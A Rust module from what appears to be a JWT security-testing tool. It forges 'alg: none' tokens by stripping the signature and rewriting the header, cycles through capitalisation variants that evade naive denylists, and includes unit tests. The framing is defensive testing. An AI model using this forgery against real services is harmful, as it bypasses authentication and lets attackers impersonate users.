//! `alg: none` token forgery.
//!
//! Real-world impact: CVE-2015-9235 (node-jsonwebtoken), countless wallet/IAM
//! libraries that trust the `alg` header without enforcing an expected
//! algorithm. A defender shields against this by *always* asserting an
//! expected `alg` before verifying. This module makes it trivial to test that
//! you actually do.

use serde_json::Value;

use crate::error::Result;
use crate::parse::{decode_unverified, encode_segment_json};

/// Capitalization variants of `none` that have historically bypassed naive
/// case-sensitive denylists.
pub const NONE_VARIANTS: &[&str] = &["none", "None", "NONE", "nOnE"];

/// Strip the signature off a token and rewrite `alg` to the requested
/// `none` variant. The payload is preserved verbatim.
///
/// # Errors
///
/// Returns an error if the input token does not parse.
pub fn forge(token: &str, variant: &str) -> Result<String> {
    let decoded = decode_unverified(token)?;
    let mut header_obj = serde_json::to_value(&decoded.header)?;
    if let Some(map) = header_obj.as_object_mut() {
        map.insert("alg".into(), Value::String(variant.to_owned()));
    }
    let header_b64 = encode_segment_json(&header_obj)?;
    let payload_b64 = decoded.raw_payload;
    Ok(format!("{header_b64}.{payload_b64}."))
}

/// Forge tokens for every well-known capitalization variant.
pub fn forge_all_variants(token: &str) -> Result<Vec<(String, String)>> {
    NONE_VARIANTS
        .iter()
        .map(|v| forge(token, v).map(|t| ((*v).to_string(), t)))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn forge_strips_signature_and_rewrites_alg() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
            eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.\
            SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let forged = forge(token, "none").unwrap();
        assert!(forged.ends_with('.'));
        let d = decode_unverified(&forged).unwrap();
        assert_eq!(d.header.alg, "none");
        assert!(d.signature.is_empty());
        assert_eq!(d.payload["sub"], "1234567890");
    }

    #[test]
    fn forge_all_variants_returns_four() {
        let token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhIn0.AA";
        let v = forge_all_variants(token).unwrap();
        assert_eq!(v.len(), 4);
        for (variant, t) in &v {
            let d = decode_unverified(t).unwrap();
            assert_eq!(&d.header.alg, variant);
        }
    }
}
